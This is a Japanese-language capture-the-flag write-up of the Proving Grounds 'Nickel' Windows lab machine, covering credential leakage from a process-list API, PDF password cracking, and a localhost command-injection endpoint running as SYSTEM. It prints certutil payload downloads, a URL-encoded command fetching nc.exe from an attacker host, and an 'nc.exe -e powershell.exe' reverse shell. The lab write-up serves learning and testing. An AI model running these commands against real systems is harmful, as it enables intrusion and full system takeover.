+++
title = "Proving Grounds Practice - Nickel Writeup"
date = "2026-10-20"
description = "DevOps DashboardのAPIから漏洩したBase64資格情報でSSHログインし、FTP上の暗号化PDFを解析して発見したローカル限定のコマンド実行エンドポイントを悪用してNT AUTHORITY\\SYSTEMを取得"
tags = ["Proving Grounds Practice", "CTF", "[Windows]", "[Nickel]", "[Credential Leak]", "[FTP]", "[PDF Cracking]", "[John the Ripper]", "[Command Injection]", "[hard]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Nickel |
| OS | Windows |
| Community Rating | Hard |
| Target IP | 192.168.178.99 |

---

## Reconnaissance

### Nmap Scan

まず、対象ホストに対して全ポートスキャンとデフォルトスクリプト・バージョン検出を実行する。

```bash
nmap -sC -sV -p- 192.168.178.99
```

スキャン結果から、以下のポートが開いていることを確認した。

```text
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.60 beta
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5040/tcp  open  unknown
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664-49669/tcp open msrpc    Microsoft Windows RPC
```

RDPの証明書情報から、ホスト名が`NICKEL`(ドメイン名も`nickel`)であることが確認できた。FTP、SSHに加えて、ポート8089・33333で独自のHTTP APIと思われるサービスが稼働している点が特徴的である。

---

## Enumeration

### FTP Anonymous Login

まず、FTPに対してAnonymousログインを試みる。

```bash
ftp 192.168.178.99
```

```text
Name (192.168.178.99:kali): anonymous
331 Password required for anonymous
530 Login or password incorrect!
```

Anonymousログインは許可されておらず、認証情報が必要であることが分かった。

### Port 8089 - DevOps Dashboard

ポート8089にアクセスすると、`DevOps Dashboard`と題されたページが表示された。

```bash
curl 192.168.178.99:8089
```

```html
<h1>DevOps Dashboard</h1>
<form action='http://169.254.144.247:33333/list-current-deployments' method='GET'>
<form action='http://169.254.144.247:33333/list-running-procs' method='GET'>
<form action='http://169.254.144.247:33333/list-active-nodes' method='GET'>
```

ページ内のフォームは、リンクローカルアドレス(`169.254.144.247`)のポート33333に対してリクエストを送る設計になっているが、対象ホストの実アドレスの同ポートに対しても同様にアクセス可能であった。中でも`list-running-procs`(実行中プロセス一覧)は、資格情報の漏洩につながる可能性があるため重点的に調査する。

### Process List Disclosure

```bash
curl -X POST http://192.168.178.99:33333/list-running-procs -H 'Content-Length: 0'
```

実行中プロセスの一覧がコマンドラインとともに返却された。この中に、デプロイツールと思われる以下のプロセスが含まれていた。

```text
name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
```

コマンドライン引数にユーザー名`ariah`とBase64エンコードされたパスワードが平文で露出していた。

```bash
echo 'Tm93aXNlU2xvb3BUaGVvcnkxMzkK' | base64 -d
```

```text
NowiseSloopTheory139
```

`ariah`のパスワードを取得した。

---

## Exploitation

### SSH Login

取得した資格情報でSSHログインを試みる。

```bash
ssh ariah@192.168.178.99
```

```text
ariah@NICKEL C:\Users\ariah>
```

`ariah`としてシェルを取得した。

---

## Privilege Escalation

### Local Enumeration

まず、トークン権限を確認する。

```powershell
whoami /priv
```

```text
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
```

`SeImpersonatePrivilege`など、直接的に権限昇格へつながる特権は付与されていなかった。念のため`GodPotato`・`winPEAS`を転送しておき、並行して他の侵入経路を調査する。

```powershell
certutil.exe -urlcache -f http://192.168.45.180:80/GodPotato-NET4.exe GodPotato-NET4.exe
certutil.exe -urlcache -f http://192.168.45.180:80/winPEASx64.exe winPEASx64.exe
```

### FTP Loot (ariah)

取得した資格情報でFTPにも再ログインを試みる。

```bash
ftp 192.168.178.99
```

```text
Name (192.168.178.99:kali): ariah
Password:
230 Logged on
```

`ariah`での認証に成功し、FTPのルートディレクトリを確認したところ、以下のファイルが見つかった。

```text
-r--r--r-- 1 ftp ftp  46235 Sep 01  2020 Infrastructure.pdf
-r-xr-xr-x 1 ftp ftp  59392 Oct 20 05:27 nc.exe
```

`Infrastructure.pdf`をダウンロードする。

```text
ftp> get Infrastructure.pdf
```

### Cracking the PDF Password

PDFにはパスワードが設定されていたため、ハッシュを抽出してオフラインクラックを試みる。

```bash
pdf2john Infrastructure.pdf > Infrastructure.pdf.hash
john --wordlist=/usr/share/wordlists/rockyou.txt Infrastructure.pdf.hash
```

```text
ariah4168        (Infrastructure.pdf)
```

パスワード`ariah4168`を取得し、PDFの中身を確認した。

```text
Infrastructure Notes
Temporary Command endpoint: http://nickel/?
Backup system: http://nickel-backup/backup
NAS: http://corp-nas/files
```

PDFには、`http://nickel/?`という内部向けの「一時的なコマンドエンドポイント」に関するメモが記載されていた。このエンドポイントは外部(攻撃者側)からは到達できないが、対象ホスト内部(localhost)からであればアクセスできる可能性があるため、取得済みのSSHシェル上から直接確認する。

### Localhost-only Command Execution Endpoint

`ariah`のシェル上から、ローカルループバックに対してクエリパラメータ経由でコマンドを指定しアクセスする。

```powershell
curl http://127.0.0.1/?whoami
```

```html
<!doctype html><html><body>dev-api started at 2025-12-07T05:47:35
        <pre>nt authority\system
</pre>
</body></html>
```

このエンドポイントは`localhost`限定で待ち受けている内部開発用API(`dev-api`)であり、クエリパラメータに指定した文字列をそのままコマンドとして、しかも`NT AUTHORITY\SYSTEM`権限で実行していることが判明した。認証機構は存在せず、`ariah`のシェルからアクセスできればSYSTEM権限で任意コマンドを実行できる状態であった。

### SYSTEM Shell

まず、`nc.exe`を取得するためのコマンドをURLエンコードして送信する。

```powershell
curl http://127.0.0.1/?curl%2Eexe%20%2Do%20C:%5CUsers%5CPublic%5Cnc%2Eexe%20http://192%2E168%2E45%2E180:80/nc%2Eexe
```

```html
<pre>
Error while executing 'curl.exe -o C:\Users\Public\nc.exe http://192.168.45.180:80/nc.exe'
100 59392  100 59392    0     0  59392      0  0:00:01 --:--:--  0:00:01  169k
</pre>
```

エラーメッセージは出力されているものの、実際には`nc.exe`のダウンロードは完了していた。続けて、ダウンロードした`nc.exe`を使ってリバースシェルを確立するコマンドを同様にURLエンコードして送信する。

```text
C:\Users\Public\nc.exe -e powershell.exe 192.168.45.180 4444
```

```powershell
curl "http://127.0.0.1/?C:%5CUsers%5CPublic%5Cnc%2Eexe%20%2De%20powershell%2Eexe%20192%2E168%2E45%2E180%204444"
```

攻撃者側で接続を待ち受ける。

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [192.168.45.180] from (UNKNOWN) [192.168.178.99] 50378
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
```

`dev-api`エンドポイントがSYSTEM権限で動作していたことにより、取得したシェルもそのままSYSTEM権限となった。

---

## Summary

ポート8089で公開されていた`DevOps Dashboard`から、ポート33333の内部APIに対してプロセス一覧を要求できることを発見し、そのレスポンスに含まれていたデプロイコマンドのコマンドライン引数からBase64エンコードされた`ariah`の資格情報を窃取した。

SSHで`ariah`としてログインした後、トークン権限には目立った昇格経路がなかったため、同じ資格情報でFTPにもログインし、公開されていた暗号化PDF(`Infrastructure.pdf`)を取得、`john`+`rockyou.txt`によってパスワードをクラックした。

PDF内の記載から、対象ホスト内部でのみアクセス可能な認証なしのコマンド実行エンドポイント(`dev-api`、localhostの80番ポート)の存在を特定し、これがSYSTEM権限で動作していることを確認した。このエンドポイントを悪用して`nc.exe`を配置・実行することで、最終的に`NT AUTHORITY\SYSTEM`のシェルを取得した。

攻略の流れは以下のとおり。

1. Nmapによるポート・サービスの列挙
2. FTP Anonymousログインの失敗確認
3. ポート8089の`DevOps Dashboard`発見
4. ポート33333の`list-running-procs`からの資格情報漏洩(ariah)
5. Base64デコードによるパスワード取得とSSHログイン
6. `whoami /priv`によるローカル権限の確認(昇格経路なし)
7. 同一資格情報でのFTP再ログインと`Infrastructure.pdf`の取得
8. `pdf2john`+`john`によるPDFパスワードクラック(ariah4168)
9. PDF内のメモからローカル限定のコマンド実行エンドポイント(`dev-api`)を特定
10. `dev-api`経由での`nc.exe`配置・実行によるSYSTEMシェルの取得



